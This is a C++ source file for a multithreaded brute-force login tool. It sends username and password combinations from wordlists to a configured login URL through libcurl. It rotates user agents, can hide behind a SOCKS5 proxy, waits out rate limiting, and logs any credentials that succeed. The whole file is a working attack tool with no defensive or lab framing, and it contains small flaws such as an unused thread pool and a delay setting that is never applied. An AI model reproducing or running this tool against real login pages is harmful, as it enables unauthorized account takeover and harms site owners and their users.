// This file contains the implementation of a brute-force login script using cURL and a thread pool.
// It includes functions for attempting logins, managing threads, and handling configuration from a JSON file.

#include <iostream>           // For standard I/O operations
#include <fstream>            // For file I/O operations
#include <string>             // For string manipulation
#include <vector>             // For using vectors
#include <thread>             // For using threads
#include <chrono>             // For time-related functions
#include <mutex>              // For mutex locks
#include <queue>              // For using queues
#include <condition_variable> // For condition variables
#include <curl/curl.h>        // For cURL library functions
#include <nlohmann/json.hpp>  // For JSON manipulation
#include <random>             // For random number generation
#include <cstdlib>            // For general purpose functions
#include <atomic>             // For atomic variables
#include <iomanip>            // For input/output manipulation
#include <ctime>              // For time functions
#include <sstream>            // For string stream manipulation
#include <functional>         // For function objects
#include <memory>             // For smart pointers

using namespace std;         // Use the standard namespace
using json = nlohmann::json; // Use the nlohmann::json namespace for JSON

// Global variables
string LOGIN_URL;                                                                          // The URL of the login endpoint
bool stop_on_success = false;                                                              // Flag to stop all threads on success
int thread_count = 4;                                                                      // Number of threads to use
int request_delay = 100;                                                                   // Delay between requests in milliseconds
mutex cout_mutex, queue_mutex;                                                             // Mutexes for thread synchronization
condition_variable cv;                                                                     // Condition variable for thread synchronization
atomic<bool> stop_threads(false);                                                          // Atomic flag to stop threads
bool valid_credentials_found = false;                                                      // Flag to indicate if valid credentials are found
string proxy;                                                                              // Proxy URL
vector<string> user_agents = {"Mozilla/5.0", "Chrome/91.0", "Safari/537.36", "Edge/90.0"}; // List of user agents
queue<pair<string, string>> task_queue;                                                    // Queue of username/password pairs
ofstream log_file;                                                                         // Log file

// Callback function for cURL to write response data
size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp)
{
    ((string *)userp)->append((char *)contents, size * nmemb); // Append the response data to the string
    return size * nmemb;                                       // Return the number of bytes processed
}

// Function to get a random user agent from the list
string get_random_user_agent()
{
    random_device rd;                                          // Random device
    mt19937 gen(rd());                                         // Mersenne Twister random number generator
    uniform_int_distribution<> dis(0, user_agents.size() - 1); // Uniform distribution
    return user_agents[dis(gen)];                              // Return a random user agent
}

// Function to print colored messages to the console
void print_colored(const string &message, const string &color)
{
    if (color == "green")
    {
        cout << "\033[32m" << message << "\033[0m" << endl; // Print green message
    }
    else if (color == "red")
    {
        cout << "\033[31m" << message << "\033[0m" << endl; // Print red message
    }
    else if (color == "yellow")
    {
        cout << "\033[33m" << message << "\033[0m" << endl; // Print yellow message
    }
    else
    {
        cout << message << endl; // Print default message
    }
}

// Function to get the current timestamp as a string
string current_timestamp()
{
    auto now = chrono::system_clock::now();                    // Get the current time
    time_t now_time = chrono::system_clock::to_time_t(now);    // Convert to time_t
    stringstream ss;                                           // String stream
    ss << put_time(localtime(&now_time), "%Y-%m-%d %H:%M:%S"); // Format the time
    return ss.str();                                           // Return the formatted time as a string
}

// Function to attempt a login with the given username and password
bool attempt_login(const string &username, const string &password)
{
    CURL *curl;      // cURL handle
    CURLcode res;    // cURL result code
    string response; // Response data

    curl = curl_easy_init(); // Initialize cURL
    if (curl)
    {
        string post_fields = "username=" + username + "&password=" + password; // Create POST fields

        curl_easy_setopt(curl, CURLOPT_URL, LOGIN_URL.c_str());                     // Set the URL
        curl_easy_setopt(curl, CURLOPT_POST, 1L);                                   // Set the request method to POST
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_fields.c_str());            // Set the POST fields
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);              // Set the write callback function
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);                       // Set the response data
        curl_easy_setopt(curl, CURLOPT_USERAGENT, get_random_user_agent().c_str()); // Set a random user agent

        if (!proxy.empty())
        {
            curl_easy_setopt(curl, CURLOPT_PROXY, proxy.c_str());        // Set the proxy
            curl_easy_setopt(curl, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5); // Set the proxy type to SOCKS5
        }

        res = curl_easy_perform(curl); // Perform the request

        long http_code = 0;
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code); // Get the HTTP response code

        if (http_code == 429)
        {
            lock_guard<mutex> lock(cout_mutex);                         // Lock the mutex
            cerr << "Rate limited. Waiting before retrying..." << endl; // Print rate limit message
            this_thread::sleep_for(chrono::seconds(60));                // Wait for 60 seconds before retrying
        }
        else if (http_code >= 500)
        {
            lock_guard<mutex> lock(cout_mutex);                               // Lock the mutex
            cerr << "Server error: " << http_code << ". Retrying..." << endl; // Print server error message
            this_thread::sleep_for(chrono::seconds(10));                      // Wait for 10 seconds before retrying
        }

        if (res != CURLE_OK)
        {
            lock_guard<mutex> lock(cout_mutex);                                                    // Lock the mutex
            print_colored("cURL error: " + string(curl_easy_strerror(res)), "red");                // Print cURL error message
            log_file << current_timestamp() << " cURL error: " << curl_easy_strerror(res) << endl; // Log the error
        }

        curl_easy_cleanup(curl); // Clean up cURL

        if (res == CURLE_OK)
        {
            lock_guard<mutex> lock(cout_mutex);                                         // Lock the mutex
            print_colored("Server response: " + response, "yellow");                    // Print server response
            log_file << current_timestamp() << " Server response: " + response << endl; // Log the response

            if (response.find("Welcome") != string::npos)
            {
                valid_credentials_found = true;                                                                 // Set the flag to indicate valid credentials found
                print_colored("Password found for " + username + ": " + password, "green");                     // Print success message
                log_file << current_timestamp() << " Password found for " + username + ": " + password << endl; // Log the success
                if (stop_on_success)
                {
                    stop_threads.store(true); // Set the atomic flag to stop threads
                    cv.notify_all();          // Notify all threads
                    return true;              // Return true to indicate success
                }
            }
        }
    }
    return false; // Return false to indicate failure
}

// Function for worker threads to process login attempts
void worker_thread()
{
    random_device rd;                        // Random device
    mt19937 gen(rd());                       // Mersenne Twister random number generator
    uniform_int_distribution<> dis(50, 150); // Uniform distribution for delay

    while (true)
    {
        pair<string, string> task; // Task to process
        {
            unique_lock<mutex> lock(queue_mutex); // Lock the queue mutex
            cv.wait(lock, []
                    { return !task_queue.empty() || stop_threads.load(); }); // Wait for tasks or stop signal
            if (stop_threads.load() && task_queue.empty())
                return;                // Exit if stop signal is set and queue is empty
            task = task_queue.front(); // Get the next task
            task_queue.pop();          // Remove the task from the queue
        }

        {
            lock_guard<mutex> lock(cout_mutex);                                                           // Lock the cout mutex
            cout << "Trying: " << task.first << " / " << task.second << endl;                             // Print the task
            log_file << current_timestamp() << " Trying: " << task.first << " / " << task.second << endl; // Log the task
        }

        if (attempt_login(task.first, task.second))
        {
            return; // Exit if login attempt is successful
        }
        this_thread::sleep_for(chrono::milliseconds(dis(gen))); // Sleep for a random delay
    }
}

// ThreadPool class to manage worker threads
class ThreadPool
{
public:
    ThreadPool(size_t); // Constructor
    template <class F>
    void enqueue(F f); // Function to enqueue tasks
    ~ThreadPool();     // Destructor

private:
    vector<thread> workers;        // Vector of worker threads
    queue<function<void()>> tasks; // Queue of tasks
    mutex queue_mutex;             // Mutex for task queue
    condition_variable condition;  // Condition variable for task queue
    bool stop;                     // Flag to stop the thread pool
};

// Constructor to initialize the thread pool
inline ThreadPool::ThreadPool(size_t threads) : stop(false)
{
    for (size_t i = 0; i < threads; ++i)
        workers.emplace_back([this]
                             {
            for(;;) {
                function<void()> task;
                {
                    unique_lock<mutex> lock(this->queue_mutex);
                    this->condition.wait(lock, [this] { return this->stop || !this->tasks.empty(); });
                    if(this->stop && this->tasks.empty())
                        return;
                    task = move(this->tasks.front());
                    this->tasks.pop();
                }
                task();
            } });
}

// Function to enqueue tasks in the thread pool
template <class F>
void ThreadPool::enqueue(F f)
{
    {
        unique_lock<mutex> lock(queue_mutex); // Lock the queue mutex
        if (stop)
            throw runtime_error("enqueue on stopped ThreadPool"); // Throw error if thread pool is stopped
        tasks.emplace(f);                                         // Add the task to the queue
    }
    condition.notify_one(); // Notify one worker thread
}

// Destructor to clean up the thread pool
inline ThreadPool::~ThreadPool()
{
    {
        unique_lock<mutex> lock(queue_mutex); // Lock the queue mutex
        stop = true;                          // Set the stop flag
    }
    condition.notify_all(); // Notify all worker threads
    for (thread &worker : workers)
        worker.join(); // Join all worker threads
}

// Function to load configuration from a JSON file
bool load_config(const string &config_file)
{
    ifstream file(config_file);
    if (!file)
    {
        cerr << "Error opening configuration file: " << config_file << endl;
        return false;
    }

    json config;
    file >> config;

    LOGIN_URL = config["login_url"].get<string>();
    stop_on_success = config["stop_on_success"].get<bool>();
    thread_count = config["threads"].get<int>();
    request_delay = config["delay"].get<int>();
    proxy = config["proxy"].get<string>();

    string user_agents_file = config["user_agents"].get<string>();
    string log_file_name = config["log_file"].get<string>();
    string usernames_file_name = config["usernames"].get<string>();
    string passwords_file_name = config["passwords"].get<string>();

    ifstream usernames_file(usernames_file_name);
    ifstream passwords_file(passwords_file_name);
    ifstream user_agents_stream(user_agents_file);

    if (!usernames_file || !passwords_file || !user_agents_stream)
    {
        cerr << "Error opening input files!" << endl;
        return false;
    }

    log_file.open(log_file_name, ios::app);
    if (!log_file)
    {
        cerr << "Error opening log file!" << endl;
        return false;
    }

    string user_agent;
    user_agents.clear();
    while (getline(user_agents_stream, user_agent))
    {
        user_agents.push_back(user_agent);
    }

    string username, password;
    while (getline(usernames_file, username))
    {
        ifstream passwords_file(passwords_file_name);
        while (getline(passwords_file, password))
        {
            task_queue.emplace(username, password);
        }
    }

    return true;
}

// Main function
int main(int argc, char *argv[])
{
    if (argc < 2)
    {
        cerr << "Usage: " << argv[0] << " <config_file.json>" << endl;
        return 1; // Print usage and exit if arguments are missing
    }

    string config_file = argv[1];
    if (!load_config(config_file))
    {
        return 1; // Exit if configuration loading fails
    }

    ThreadPool pool(thread_count); // Create the thread pool

    vector<thread> workers;
    for (int i = 0; i < thread_count; ++i)
    {
        workers.emplace_back(worker_thread);
    }

    for (auto &worker : workers)
    {
        worker.join();
    }

    if (!valid_credentials_found)
    {
        cout << "No valid credentials found." << endl; // Print message if no valid credentials are found
    }
    return 0; // Exit the program
}